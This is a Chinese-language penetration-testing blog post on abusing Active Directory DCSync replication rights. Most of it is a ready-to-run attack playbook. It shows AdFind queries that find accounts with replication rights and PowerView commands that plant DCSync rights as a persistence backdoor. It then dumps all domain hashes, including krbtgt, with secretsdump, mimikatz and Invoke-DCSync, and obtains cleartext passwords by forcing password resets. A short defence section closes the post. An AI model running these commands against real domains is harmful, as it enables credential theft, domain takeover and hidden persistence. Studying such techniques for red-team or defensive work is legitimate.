---
title: 攻击方式 - 滥用 DCsync
date: 2026-08-24 21:00:00
categories:
  - 渗透测试
tags:
  - DCsync
  - 域渗透
  - Active Directory
description: DCsync 攻击原理与利用手法
---

### 滥用DCsync：
定义： 攻击者模拟另一台域控，滥用域控之间的目录复制协议，远程向域控请求复制域内账号密码哈希，**无需登录域控、不用读取 NTDS.dit 文件，即可导出全部域用户 NTLM 哈希**。  

工作原理:

+ 在网络中发现域控
+ 利用 目录复制服务 的GetNCChanges接口向域控发起数据同步请求
+  域控把域内账号密码哈希等敏感数据作为复制数据返回攻击者，完成哈希窃取  

### 攻击条件：
1. 有DCsync权限的用户
2. 或者可修改DCsync的ACL的用户

>  默认：域管理员、域控机器账号自带 DCSync 权限。普通账号被误授予这两条权限即可直接执行攻击。  
>

### 实战场景：
+ 拿到域内账号，枚举 ACL 发现账号具备 DCSync 复制权限，直接 dump 域内全部 hash，不用横向移动到域控主机。
+ 获取拥有`WriteDacl`权限账号，给当前账号添加 DCSync 权限，做域内持久化，后续随时导出哈希。
+ 内网拿到一台普通机器权限，账号有复制权限，直接远程导出域管哈希，完成域控接管。
+ 红队后渗透，需要批量拿到域内所有用户凭据时优先考虑 DCSync。

### 攻击过程：
#### 1️⃣查找/修改域内具有DCsync权限的用户
##### 具有DCsync权限的用户
###### 特殊组内用户：
**Administrator组用户，Domain Admin组用户，Enterprise Admin组用户，域控计算机账户**

###### Adfind 查询域内具有DCsync权限的用户
> DCSync 需要两条扩展权限：
>
> 1. `Replicating Directory Changes`（DS‑Replication‑Get‑Changes）
> 2. `Replicating Directory Changes All`（DS‑Replication‑Get‑Changes‑All）
>

（1）查询拥有【复制目录更改】权限

```plain
AdFind.exe -s subtree -b "DC=test,DC=com" nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Changes";; -recmute -resolvesids
```

（2）查询拥有【复制目录全部更改】权限（DCSync 必备）

```plain
AdFind.exe -s subtree -b "DC=test,DC=com" nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Changes All";; -recmute -resolvesids
```

将`DC=test,DC=com`替换成自己域的根 DN；`‑resolvesids`自动把 SID 解析为账号名。

##### 修改DCsync的ACL 添加DCSync 权限
###### 查询拥有 WriteDacl（可修改 ACL，可以给自己添加 DCSync 权限）账号  （是修改DCsync的ACL的前提）
```plain
AdFind.exe -s subtree -b "DC=test,DC=com" nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"WriteDacl";; -recmute -resolvesids
```

###### 用PowerView.ps1脚本 给普通用户添加DCSync 权限
```plain
# 导入脚本
Import-Module .\PowerView.ps1

# TargetIdentity：域根DN；PrincipalIdentity：要赋予DCSync的普通域账号
Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity testuser -Rights DCSync -Verbose
```

###### 验证权限是否添加成功（PowerView）
```plain
# 查询域根对象ACL，查看testuser是否拥有两条复制权限
Get-DomainObjectAcl -Identity "DC=test,DC=com" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -match (Get-DomainUser testuser).ObjectSid}
```

###### 移除 DCSync 后门权限
```plain
Remove-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity testuser -Rights DCSync -Verbose
```

#### 2️⃣DCsync攻击->获取域内所有用户hash
##### secretsdump.py脚本（Impacket脚本）
```plain
python3 secretsdump.py test.com/testuser:password@192.168.1.10 -just-dc
#指定某一用户：
python3 secretsdump.py test.com/testuser:password@192.168.1.10 -just-dc-user krbtgt
```

>  192.168.1.10 是域控 IP  ； 远程执行，不需要登陆主机  
>

##### mimikatz
```plain
mimikatz.exe
# 可选提升权限，部分环境需要
token::elevate
# DCSync导出全部hash
lsadump::dcsync /domain:test.com /all
```

##### Invoke-DCsync.ps1脚本（PowerShell脚本）
```plain
Import-Module .\Invoke-DCSync.ps1
Invoke-DCSync -Domain test.com
```

#### 3️⃣利用DCsync获取明文凭据（当hash爆破不出来时）
原理： 当设置用户属性时，勾选了 “使用可逆加密存储密码” 属性，**用户更改密码之后**，DCSync 可以直接导出该用户明文密码（普通 NTLM hash 不能解密出明文,**因为有的hash爆破不出来**）。  

实战判断：

+ 通过 DCSync 导出凭据后，观察输出结果，存在 `Cleartext password` 字段，说明该账号开启可逆加密存储密码，拿到明文；
+ 注意：只勾选该选项**不修改密码，不会生成可解密的明文凭据**，必须重置 / 更改一次密码才生效。

##### secretsdump.py脚本（Impacket脚本）
```plain
python3 secretsdump.py test.com/testuser:password -dc-ip 192.168.1.10 -just-dc-user tset
```

#####  域用户重置 / 更改密码（配合 DCSync 可逆加密）
>   区分：
>
> + **更改密码 (change password)**：需要知道旧密码
> + **重置密码 (reset password)**：不需要旧密码，需要账号具备`ForceChangePassword`权限
>

###### Windows CMD（net user，简单）
```plain
# 域用户修改密码，需要当前账号有权限
net user testuser "NewPass@123" /domain
```

`/domain`代表操作域控 SAM 数据库，不是本地机器

###### PowerView.ps1（常用，不需要旧密码，重置密码）
```plain
Import-Module .\PowerView.ps1
$newpwd = ConvertTo-SecureString "NewPass@123" -AsPlainText -Force
Set‑DomainUserPassword‑Identity testuser‑NewPassword $newpwd
```

前提：当前账号拥有目标用户`ForceChangePassword`权限（GenericAll/GenericWrite 都包含该权限）

###### 官方 AD 模块 Set‑ADAccountPassword（域控本机）
```plain
$newpwd = ConvertTo-SecureString "NewPass@123" -AsPlainText -Force
Set‑ADAccountPassword‑Identity testuser‑Reset‑NewPassword $newpwd
```

`‑Reset`：代表密码重置，不用提供旧密码

###### Linux 攻击机 Impacket changepasswd.py（远程改密码）
```plain
python3 changepasswd.py test.com/admin:'Admin@123'@192.168.1.10 -newpass 'NewPass@123'
```

admin 是拥有重置权限账号，192.168.1.10 域控 IP

###### bloodyAD（kali，ACL 滥用重置密码）
```plain
bloodyAD -d test.com -u admin -p 'Admin@123' -i 192.168.1.10 set password testuser 'NewPass@123'
```

---

##### 完整链路
1. 用户属性勾选：**使用可逆加密存储密码**
2. 执行密码重置 / 更改（上面任意一条命令）
3. DCSync 执行 secretsdump.py/mimikatz 同步域数据
4. 输出结果观察`Cleartext password`字段拿到明文

### DCsync攻击防御
1. 设置白名单，指定白名单内的域控ip可发起请求数据同步
2. DCsync ACL滥用检测工具：Execute-ACLight2.bat脚本

```plain
Execute-ACLight2.bat -Domain test.com
```

3. 发现恶意用户，移除其DCsync权限：

```plain
Remove-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity testuser -Rights DCSync -Verbose
```



